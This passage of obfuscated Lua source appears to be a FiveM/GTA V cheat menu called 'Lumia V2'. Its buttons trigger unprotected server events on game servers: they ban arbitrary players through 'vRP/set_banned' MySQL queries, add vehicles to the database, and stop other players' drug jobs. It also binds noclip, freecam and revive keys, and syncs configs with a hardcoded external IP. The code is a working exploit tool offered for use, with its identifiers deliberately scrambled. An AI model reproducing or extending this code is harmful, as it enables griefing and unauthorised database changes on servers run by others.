                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Stop All Actions', 5, 20, 140) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_feild_coke'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_process_coke'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_sell_coke'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_feild_meth'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_process_meth'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_sell_meth'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_feild_weed'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_process_weed'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_sell_weed'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_feild_opium'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_process_opium'])
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['stop_sell_opium'])
                            end
                        end
                        if trigy == 50 then
                            trigy = trigy + 19
                        end
                        if trigy == 69 then
                            jrnyLearIyzKiSIen.func.DrawSomeText('No Drug Triggers Where Found', 4, false, jrnyLearIyzKiSIen.config.MainX + 55, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + 260, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    elseif REVMYmrswsZvxOXvJE.TrigOpts.values[REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex] == 'vrptrigs' then
                        if nlFXKkFxuKQAk.natives.GetResourceState('vrp_mysql') == 'started' then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Ban Player (Specific)', 5, trigy) then
                                local player_id = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Players ID', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, "vRP:MySQL_query", "vRP/set_banned", {banned = 1, user_id = player_id}, 2)
                            end
                            trigy = trigy + 20
                        end
                        if nlFXKkFxuKQAk.natives.GetResourceState('vrp_mysql') == 'started' then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Yourself A Car (Specific)', 5, trigy) then
                                local player_id = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Players ID to Recive the Car', '', 100)
                                local vehicles = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Vehicle Modle', '', 100)
                                if nlFXKkFxuKQAk.natives.IsModelValid(vehicles) and nlFXKkFxuKQAk.natives.IsModelAVehicle(vehicles) then
                                    local plate = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Vehicle Plate', '', 8)
                                    jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, "vRP:MySQL_query", "vRP/add_custom_vehicle", {user_id = player_id, vehicle = vehicles, vehicle_plate = plate, veh_type = "car"}, 2)
                                else
                                    RfPsUKHSFWJuBEJuz.rE.pront('Bad Model')
                                end
                            end
                            trigy = trigy + 20
                        end
                        if trigy == 50 then
                            trigy = trigy + 19
                        end
                        if trigy == 69 then
                            jrnyLearIyzKiSIen.func.DrawSomeText('No VRP Triggers Where Found', 4, false, jrnyLearIyzKiSIen.config.MainX + 55, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + 260, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    end

                    jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + trigy - 10
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                elseif REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 4 then
                    jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 175
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                
                    if jrnyLearIyzKiSIen.config.Keybinds.HealthKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.HealthKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.ArmorKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.ArmorKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.RepairKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.RepairKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.ReviveKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.ReviveKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.FreecamKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.FreecamKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.NoclipKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.NoclipKn = 'NONE' end
                    if jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn = 'NONE' end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Health: ', 5, 30) then
                        jrnyLearIyzKiSIen.config.healthbind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.HealthKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 20, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Armor: ', 5, 50) then
                        jrnyLearIyzKiSIen.config.armorbind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.ArmorKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 40, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Repair: ', 5, 70) then
                        jrnyLearIyzKiSIen.config.repairbind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.RepairKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 60, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Revive: ', 5, 90) then
                        jrnyLearIyzKiSIen.config.revivebind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.ReviveKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 80, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Freecam: ', 5, 110) then
                        jrnyLearIyzKiSIen.config.freecambind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.FreecamKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 100, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Noclip: ', 5, 130) then
                        jrnyLearIyzKiSIen.config.noclipbind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.NoclipKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 120, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Console: ', 5, 150) then
                        jrnyLearIyzKiSIen.config.consolebind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 140, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Open Key: ', 5, 170) then
                        jrnyLearIyzKiSIen.config.openmenbind = true
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.OpenKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 65, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 160, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                elseif REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 5 then
                    jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 155
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Default Colors', 5, 10, 160) then
                        jrnyLearIyzKiSIen.config.CPrimary2.r = 75
                        jrnyLearIyzKiSIen.config.CPrimary2.g = 116
                        jrnyLearIyzKiSIen.config.CPrimary2.b = 164
                        jrnyLearIyzKiSIen.config.CPrimary2.a = 150
                        jrnyLearIyzKiSIen.config.CPrimary.r = 75 
                        jrnyLearIyzKiSIen.config.CPrimary.g = 116
                        jrnyLearIyzKiSIen.config.CPrimary.b = 164
                        jrnyLearIyzKiSIen.config.CPrimary.a = 255
                        jrnyLearIyzKiSIen.config.CSecondary.r = 73
                        jrnyLearIyzKiSIen.config.CSecondary.g = 150
                        jrnyLearIyzKiSIen.config.CSecondary.b = 205
                        jrnyLearIyzKiSIen.config.CSecondary.a = 255
                        jrnyLearIyzKiSIen.config.CSecondary2.r = 100
                        jrnyLearIyzKiSIen.config.CSecondary2.g = 200
                        jrnyLearIyzKiSIen.config.CSecondary2.b = 245
                        jrnyLearIyzKiSIen.config.CSecondary2.a = 150
                        jrnyLearIyzKiSIen.config.CText.r = 255
                        jrnyLearIyzKiSIen.config.CText.g = 255
                        jrnyLearIyzKiSIen.config.CText.b = 255
                        jrnyLearIyzKiSIen.config.CText.a = 255
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Menu Colors To Default')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('~r~KILL MENU', 5, 30, 160) then
                        jrnyLearIyzKiSIen.config.dienow = false
                        jrnyLearIyzKiSIen.config.openkeydefine = false
                        jrnyLearIyzKiSIen.config.breathon = false
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Menu Size', REVMYmrswsZvxOXvJE.Mopt4S.items, REVMYmrswsZvxOXvJE.Mopt4S.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt4S.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.Mopt4S.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.Mopt4S.selectedItemIndex = selectedIndex
                    end, 5, 30) then end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Rainbow Menu', jrnyLearIyzKiSIen.config.features.RBM, function(enabled) jrnyLearIyzKiSIen.config.features.RBM = enabled end, 5, 50) then 
                        if jrnyLearIyzKiSIen.config.features.RBM then
                            jrnyLearIyzKiSIen.config.CPrimary2.r = 0
                            jrnyLearIyzKiSIen.config.CPrimary2.g = 0
                            jrnyLearIyzKiSIen.config.CPrimary2.b = 0
                            jrnyLearIyzKiSIen.config.CPrimary2.a = 150
                            jrnyLearIyzKiSIen.config.CPrimary.r = 0 
                            jrnyLearIyzKiSIen.config.CPrimary.g = 0
                            jrnyLearIyzKiSIen.config.CPrimary.b = 0
                            jrnyLearIyzKiSIen.config.CPrimary.a = 255
                            jrnyLearIyzKiSIen.config.CSecondary.r = 0
                            jrnyLearIyzKiSIen.config.CSecondary.g = 0
                            jrnyLearIyzKiSIen.config.CSecondary.b = 0
                            jrnyLearIyzKiSIen.config.CSecondary.a = 255
                            jrnyLearIyzKiSIen.config.CSecondary2.r = 0
                            jrnyLearIyzKiSIen.config.CSecondary2.g = 0
                            jrnyLearIyzKiSIen.config.CSecondary2.b = 0
                            jrnyLearIyzKiSIen.config.CSecondary2.a = 150
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Rainbow Menu ~g~ON')
                        else
                            jrnyLearIyzKiSIen.config.CPrimary2.r = 75
                            jrnyLearIyzKiSIen.config.CPrimary2.g = 116
                            jrnyLearIyzKiSIen.config.CPrimary2.b = 164
                            jrnyLearIyzKiSIen.config.CPrimary2.a = 150
                            jrnyLearIyzKiSIen.config.CPrimary.r = 75 
                            jrnyLearIyzKiSIen.config.CPrimary.g = 116
                            jrnyLearIyzKiSIen.config.CPrimary.b = 164
                            jrnyLearIyzKiSIen.config.CPrimary.a = 255
                            jrnyLearIyzKiSIen.config.CSecondary.r = 73
                            jrnyLearIyzKiSIen.config.CSecondary.g = 150
                            jrnyLearIyzKiSIen.config.CSecondary.b = 205
                            jrnyLearIyzKiSIen.config.CSecondary.a = 255
                            jrnyLearIyzKiSIen.config.CSecondary2.r = 100
                            jrnyLearIyzKiSIen.config.CSecondary2.g = 200
                            jrnyLearIyzKiSIen.config.CSecondary2.b = 245
                            jrnyLearIyzKiSIen.config.CSecondary2.a = 150
                            jrnyLearIyzKiSIen.config.CText.r = 255
                            jrnyLearIyzKiSIen.config.CText.g = 255
                            jrnyLearIyzKiSIen.config.CText.b = 255
                            jrnyLearIyzKiSIen.config.CText.a = 255
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Rainbow Menu ~r~OFF')
                        end
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Primary Menu Color', 5, 70) then
                        local red = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Red (NUMBERS ONLY)', '', 3)
                        local green = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Green (NUMBERS ONLY)', '', 3)
                        local blue = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Blue (NUMBERS ONLY)', '', 3)
                        local alpha = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Alpha (NUMBERS ONLY)', '', 3)
                        jrnyLearIyzKiSIen.config.CPrimary.r = RfPsUKHSFWJuBEJuz.rE.LumToNum(red) 
                        jrnyLearIyzKiSIen.config.CPrimary.g = RfPsUKHSFWJuBEJuz.rE.LumToNum(green)
                        jrnyLearIyzKiSIen.config.CPrimary.b = RfPsUKHSFWJuBEJuz.rE.LumToNum(blue)
                        jrnyLearIyzKiSIen.config.CPrimary.a = RfPsUKHSFWJuBEJuz.rE.LumToNum(alpha)
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Primary Menu Drop Down Color', 5, 90) then
                        local red = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Red (NUMBERS ONLY)', '', 3)
                        local green = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Green (NUMBERS ONLY)', '', 3)
                        local blue = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Blue (NUMBERS ONLY)', '', 3)
                        local alpha = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Alpha (NUMBERS ONLY)', '', 3)
                        jrnyLearIyzKiSIen.config.CPrimary2.r = RfPsUKHSFWJuBEJuz.rE.LumToNum(red)
                        jrnyLearIyzKiSIen.config.CPrimary2.g = RfPsUKHSFWJuBEJuz.rE.LumToNum(green)
                        jrnyLearIyzKiSIen.config.CPrimary2.b = RfPsUKHSFWJuBEJuz.rE.LumToNum(blue)
                        jrnyLearIyzKiSIen.config.CPrimary2.a = RfPsUKHSFWJuBEJuz.rE.LumToNum(alpha)
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Secondary Menu Color', 5, 110) then
                        local red = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Red (NUMBERS ONLY)', '', 3)
                        local green = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Green (NUMBERS ONLY)', '', 3)
                        local blue = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Blue (NUMBERS ONLY)', '', 3)
                        local alpha = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Alpha (NUMBERS ONLY)', '', 3)
                        jrnyLearIyzKiSIen.config.CSecondary.r = RfPsUKHSFWJuBEJuz.rE.LumToNum(red)
                        jrnyLearIyzKiSIen.config.CSecondary.g = RfPsUKHSFWJuBEJuz.rE.LumToNum(green)
                        jrnyLearIyzKiSIen.config.CSecondary.b = RfPsUKHSFWJuBEJuz.rE.LumToNum(blue)
                        jrnyLearIyzKiSIen.config.CSecondary.a = RfPsUKHSFWJuBEJuz.rE.LumToNum(alpha)
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Secondary Menu Drop Down Color', 5, 130) then
                        local red = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Red (NUMBERS ONLY)', '', 3)
                        local green = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Green (NUMBERS ONLY)', '', 3)
                        local blue = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Blue (NUMBERS ONLY)', '', 3)
                        local alpha = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Alpha (NUMBERS ONLY)', '', 3)
                        jrnyLearIyzKiSIen.config.CSecondary2.r = RfPsUKHSFWJuBEJuz.rE.LumToNum(red)
                        jrnyLearIyzKiSIen.config.CSecondary2.g = RfPsUKHSFWJuBEJuz.rE.LumToNum(green)
                        jrnyLearIyzKiSIen.config.CSecondary2.b = RfPsUKHSFWJuBEJuz.rE.LumToNum(blue)
                        jrnyLearIyzKiSIen.config.CSecondary2.a = RfPsUKHSFWJuBEJuz.rE.LumToNum(alpha)
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Menu Text Color', 5, 150) then
                        local red = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Red (NUMBERS ONLY)', '', 3)
                        local green = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Green (NUMBERS ONLY)', '', 3)
                        local blue = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Blue (NUMBERS ONLY)', '', 3)
                        local alpha = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Alpha (NUMBERS ONLY)', '', 3)
                        jrnyLearIyzKiSIen.config.CText.r = RfPsUKHSFWJuBEJuz.rE.LumToNum(red)
                        jrnyLearIyzKiSIen.config.CText.g = RfPsUKHSFWJuBEJuz.rE.LumToNum(green)
                        jrnyLearIyzKiSIen.config.CText.b = RfPsUKHSFWJuBEJuz.rE.LumToNum(blue)
                        jrnyLearIyzKiSIen.config.CText.a = RfPsUKHSFWJuBEJuz.rE.LumToNum(alpha)
                    end
                elseif REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 6 then
                    jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 135
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Load Config 1', 5, 30) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        local new = nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/check/"..Id.."/1", nil, 'get')
                        if new ~= nil then
                            local decodedMessage = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(new)
                            local decodedReal = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(decodedMessage.config.config1)
                            jrnyLearIyzKiSIen.config = decodedReal
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 1 ~g~LOADED')
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Webserver Is Down, Sorry')
                        end
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Load Config 2', 5, 50) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        local new = nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/check/"..Id.."/2", nil, 'get')
                        if new ~= nil then
                            local decodedMessage = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(new)
                            local decodedReal = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(decodedMessage.config.config2)
                            jrnyLearIyzKiSIen.config = decodedReal
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 2 ~g~LOADED')
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Webserver Is Down, Sorry')
                        end
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Load Config 3', 5, 70) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        local new = nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/check/"..Id.."/3", nil, 'get')
                        local decodedMessage = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(new)
                        local decodedReal = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(decodedMessage.config.config3)
                        if new ~= nil then
                            jrnyLearIyzKiSIen.config = decodedReal
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 3 ~g~LOADED')
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Webserver Is Down, Sorry')
                        end
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Save Config 1', 5, 90) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/edit/"..Id.."/1", {
                            configData = RfPsUKHSFWJuBEJuz.rE.LumJson.LumEncode(jrnyLearIyzKiSIen.config)
                        }, 'post')
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 1 ~g~SAVED')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Save Config 2', 5, 110) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/edit/"..Id.."/2", {
                            configData = RfPsUKHSFWJuBEJuz.rE.LumJson.LumEncode(jrnyLearIyzKiSIen.config)
                        }, 'post')
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 2 ~g~SAVED')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Save Config 3', 5, 130) then
                        local Id = nlFXKkFxuKQAk.natives.rEUid()
                        nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/edit/"..Id.."/3", {
                            configData = RfPsUKHSFWJuBEJuz.rE.LumJson.LumEncode(jrnyLearIyzKiSIen.config)
                        }, 'post')
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Config 3 ~g~SAVED')
                    end
                end
            end



            nlFXKkFxuKQAk.natives.SetMouseCursorActiveThisFrame()
            nlFXKkFxuKQAk.natives.DisableAllControlActions(1)
            
            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h2, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Lumia V2', 4, true, jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY - jrnyLearIyzKiSIen.config.SubMenuWH.tit, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.sp, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
